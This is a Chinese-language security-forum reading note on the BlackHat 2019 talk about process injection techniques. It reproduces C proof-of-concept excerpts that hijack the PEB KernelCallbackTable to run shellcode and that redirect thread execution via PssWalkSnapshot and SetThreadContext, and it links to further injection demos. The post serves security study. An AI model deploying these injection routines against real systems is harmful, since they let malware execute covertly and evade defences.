
# [原创]《Process Injection Techniques - Gotta Catch Them All》议题读后记

## 0x01 《Process Injection Techniques - Gotta Catch Them All》

BlackHat 2019议题，相关链接如下：

• <a href="elink@569K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3W2Q4x3X3g2T1L8r3q4U0K9$3S2S2N6q4)9J5k6h3y4G2L8g2)9J5c8W2g2e0b7g2)9J5k6o6p5&6i4K6u0r3g2r3S2#2M7Y4y4V1j5i4W2Q4x3V1k6#2M7#2)9J5k6o6p5&6i4K6u0V1d9$3!0@1L8r3g2J5i4K6u0V1f1s2u0G2j5$3g2K6M7#2)9J5k6p5W2F1K9X3g2U0N6r3W2G2L8W2)9J5k6q4c8W2j5$3S2F1K9i4q4#2k6i4y4Q4x3X3c8s2L8%4c8@1j5g2)9J5k6p5y4S2N6r3y4Z5i4K6u0V1g2r3S2W2L8g2)9J5k6p5q4D9L8q4)9J5k6i4m8V1k6R3`.`.">Presentation Slides</a>

• <a href="elink@a51K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3W2Q4x3X3g2T1L8r3q4U0K9$3S2S2N6q4)9J5k6h3y4G2L8g2)9J5c8W2g2e0b7g2)9J5k6o6p5&6i4K6u0r3g2r3S2#2M7Y4y4V1j5i4W2Q4x3V1k6#2M7#2)9J5k6o6p5&6i4K6u0V1d9$3!0@1L8r3g2J5i4K6u0V1f1s2u0G2j5$3g2K6M7#2)9J5k6p5W2F1K9X3g2U0N6r3W2G2L8W2)9J5k6q4c8W2j5$3S2F1K9i4q4#2k6i4y4Q4x3X3c8s2L8%4c8@1j5g2)9J5k6p5y4S2N6r3y4Z5i4K6u0V1g2r3S2W2L8g2)9J5k6p5q4D9L8q4)9J5k6s2N6H3i4K6u0W2M7r3c8X3">White Paper</a>

• <a href="elink@408K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6e0j5h3k6W2b7Y4u0W2j5h3y4Z5i4K6u0V1e0r3q4T1M7#2)9J5c8Y4m8A6L8X3A6W2j5%4c8J5j5b7`.`.">Tool</a>

作者于文中讨论的是True Process Injection：

![](upload/attach/202202/817966_P47WWBTJQU7V55M.jpg)

Injection可划分为两项子技术：

![](upload/attach/202202/817966_WUD4RRGXKWA3GHD.jpg)

所以作者在Paper中将所有提到的技术划分为两类——write primitive与execution method，每一项Injection后面会标注其属于哪一类：

![](upload/attach/202202/817966_G7S8TD449SD5VZU.jpg)

作者在列出每一项Injection后分析其核心原理，给出POC，并给出评估：

![](upload/attach/202202/817966_JN2CK6S52GJXYTZ.jpg)

最后列出表格总结前文提到的所有技术。作者在最后还提到一个有意思的Auxiliary Technique：

![](upload/attach/202202/817966_G7UKDGS75RJGUUU.jpg)

Paper中第16项 KernelControlTable execution method (FinFisher/FinSpy 2018)，Lazarus在最近的攻击活动中利用了该技术——<a href="elink@1e6K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2L8h3q4D9N6$3q4J5k6h3u0&6N6r3g2K6i4K6u0W2j5$3!0E0i4K6u0r3N6r3S2J5k6h3q4@1i4K6u0V1K9h3&6@1k6h3I4D9K9h3N6W2L8X3y4W2i4K6u0r3x3U0l9J5x3W2)9J5c8U0l9I4i4K6u0r3L8X3!0J5N6r3S2Q4x3X3c8C8L8%4u0W2j5i4y4Q4x3X3c8D9j5i4A6S2M7Y4g2K6i4K6u0V1j5i4m8@1i4K6u0V1L8r3g2$3k6i4u0S2k6$3g2K6i4K6u0V1N6$3W2F1k6r3!0%4M7#2)9J5k6s2g2H3k6r3q4@1k6g2)9J5k6r3y4D9K9h3g2F1N6q4)9J5k6r3N6A6N6r3S2#2j5W2)9J5k6r3W2F1i4K6u0V1L8r3q4@1k6i4y4@1i4K6u0V1j5$3q4E0M7r3q4A6k6$3&6Q4x3V1j5`.">North Korea’s Lazarus APT leverages Windows Update client, GitHub in latest campaign</a>，笔者在[Lazarus KernelCallbackTable Hooking](https://bbs.pediy.com/thread-271435.htm)一文中对其进行了简要分析，<a href="elink@473K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1N6$3W2@1N6r3g2J5i4K6u0W2j5$3!0E0i4K6u0r3e0#2u0o6b7e0j5$3y4U0f1`.">ORCA666</a>近日发布了<a href="elink@a3cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8D9j5h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6a6f1V1y4m8y4U0j5$3i4K6u0r3K9$3y4@1K9r3W2B7j5h3y4C8">POC</a>：

```
PssSuccess = PssCaptureSnapshot(
TargetProcess,
PSS_QUERY_PROCESS_INFORMATION,
NULL,
&SnapshotHandle);
if (PssSuccess != ERROR_SUCCESS) {
printf("[!] PssCaptureSnapshot failed: Win32 error %d \n", GetLastError());
return FALSE;
}
PssSuccess = PssQuerySnapshot(
SnapshotHandle,
PSS_QUERY_PROCESS_INFORMATION,
&PI,
sizeof(PSS_PROCESS_INFORMATION)
);
if (PssSuccess != ERROR_SUCCESS) {
printf("[!] PssQuerySnapshot failed: Win32 error %d \n", GetLastError());
return FALSE;
}
if (PI.PebBaseAddress == NULL) {
printf("[!] PI.PebBaseAddress IS NULL \n");
return FALSE;
}
else {
//ReadProcessMemory(TargetProcess, PI.PebBaseAddress, &peb, sizeof(peb), &lpNumberOfBytesRead);
RtlMoveMemory(&peb, PI.PebBaseAddress, sizeof(PEB));
if (peb.KernelCallbackTable == 0){
printf("[!] KernelCallbackTable is NULL : Win32 error %d \n", GetLastError());
return FALSE;
}
else {
memcpy(&kct, peb.KernelCallbackTable, sizeof(kct));
printf("[i] [BEFORE]kct.__fnDWORD : %0-16p \n", (void*) kct.__fnDWORD);
if (Clean == TRUE){
//ReadProcessMemory(TargetProcess, WMIsAO_ADD, &Buffer, Size, &lpNumberOfBytesRead);
RtlMoveMemory(&Buffer, WMIsAO_ADD, Size);
if (Buffer == NULL) {
printf("[!] Buffer is NULL: Win32 error %d \n", GetLastError());
return FALSE;
}
}
Success = VirtualProtect(WMIsAO_ADD, Size, PAGE_READWRITE, &Old);
if (Success != TRUE) {
printf("[!] [1] VirtualProtect failed: Win32 error %d \n", GetLastError());
return FALSE;
}
memcpy(WMIsAO_ADD, rawData, Size);
Success = VirtualProtect(WMIsAO_ADD, Size, PAGE_EXECUTE_READWRITE, &Old);
if (Success != TRUE) {
printf("[!] [2] VirtualProtect failed: Win32 error %d \n", GetLastError());
return FALSE;
}
printf("[i] WMIsAO_ADD : %0-16p \n", (void*)WMIsAO_ADD);
memcpy(&Newkct, &kct, sizeof(KERNELCALLBACKTABLE));
Newkct.__fnDWORD = (ULONG_PTR)WMIsAO_ADD;
pNewkct = VirtualAlloc(NULL, sizeof(KERNELCALLBACKTABLE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
memcpy(pNewkct, &Newkct, sizeof(KERNELCALLBACKTABLE));
Success = VirtualProtect(PI.PebBaseAddress, sizeof(PEB), PAGE_READWRITE, &Old);
//WriteProcessMemory(TargetProcess, (PBYTE)PI.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &pNewkct, sizeof(ULONG_PTR), &lpNumberOfBytesWritten);
RtlMoveMemory((PBYTE)PI.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &pNewkct, sizeof(ULONG_PTR));
Success = VirtualProtect(PI.PebBaseAddress, sizeof(PEB), Old, &Old);
//if (lpNumberOfBytesWritten == 0) {
// printf("[!] WriteProcessMemory failed: Win32 error %d \n", GetLastError());
// return FALSE;
//}
//else {
Check_fnDWORDAfterOverWriting(TargetProcess);
MessageBoxA(NULL, "test", "test", MB_OK); //this will trigger the shellcode, and u wont see the messagebox ;0
if (Clean == TRUE) {
//WriteProcessMemory(TargetProcess, WMIsAO_ADD, &Buffer, sizeof(Buffer), &lpNumberOfBytesWritten);
RtlMoveMemory(WMIsAO_ADD, Buffer, sizeof(Buffer));
ZeroMemory(Buffer, sizeof(Buffer));
}
//}
return TRUE;
}
}
```

<a href="elink@c8aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1N6$3W2@1N6r3g2J5i4K6u0W2j5$3!0E0i4K6u0r3e0#2u0o6b7e0j5$3y4U0f1`.">ORCA666</a>发布的另一个项目<a href="elink@eedK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8D9j5h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6a6f1V1y4m8y4U0j5$3i4K6u0r3M7$3&6S2M7r3I4G2j5h3c8W2M7W2)9J5c8R3`.`.">snaploader</a>：

![](upload/attach/202202/817966_M674G7Z4HWMEZJF.jpg)

```
while (PssSuccess == ERROR_SUCCESS) {
++i;
PssSuccess = PssWalkSnapshot(
SnapshotHandle,
PSS_WALK_THREADS,
WalkMarkerHandle,
&Handle,
sizeof(PSS_THREAD_ENTRY)
);
if (ThreadEntry.ThreadId == TID){
memcpy(&Snapctx, ThreadEntry.ContextRecord, sizeof(CONTEXT));
printf("[+] Snapctx.Rip Before Setting : 0x%-016p\n", (void*)Snapctx.Rip);
if (Rip) {
Snapctx.Rip = *(DWORD64*)Rip;
}
if (Rsp) {
Snapctx.Rsp = *(DWORD64*)Rsp;
}
printf("[+] Snapctx.Rip After Setting : 0x%-016p\n", (void*)Snapctx.Rip);
if (!SetThreadContext(hThread, &Snapctx)) {
printf("[!] SetThreadContext FAILED with Error : %d \n", GetLastError());
return FALSE;
}
Sleep(5000);
printf("[+] DebugActiveProcessStop ...");
DebugActiveProcessStop(PID);
printf("[+] DONE \n");
}
}
```

## 0x02 PE Injection

- <a href="elink@d39K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4y4@1i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2j5$3!0E0i4K6u0r3K9r3q4K6K9r3g2J5k6i4A6S2k6r3f1`.">hasherezade</a>/**<a href="elink@bfeK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4y4@1i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2j5$3!0E0i4K6u0r3K9r3q4K6K9r3g2J5k6i4A6S2k6r3g2Q4x3V1k6W2y4X3c8S2j5e0b7I4x3U0c8X3j5h3t1%4x3K6f1@1x3K6b7&6y4$3t1$3k6o6p5J5z5e0g2W2j5$3f1I4x3l9`.`.">injection_demos.md</a>**

- <a href="elink@570K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6d9k6h3c8f1k6h3q4E0e0%4m8W2M7X3q4@1K9h3!0F1M7H3`.`.">RedTeamOperations</a>/**<a href="elink@870K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6d9k6h3c8f1k6h3q4E0e0%4m8W2M7X3q4@1K9h3!0F1M7#2)9J5c8V1q4V1N6X3q4F1j5$3g2V1i4K6u0V1f1s2u0G2j5$3g2K6M7#2)9J5k6p5W2F1K9X3g2U0N6r3W2G2L8W2)9J5k6q4N6G2M7X3E0K6K9r3!0H3">Advanced-Process-Injection-Workshop</a>**
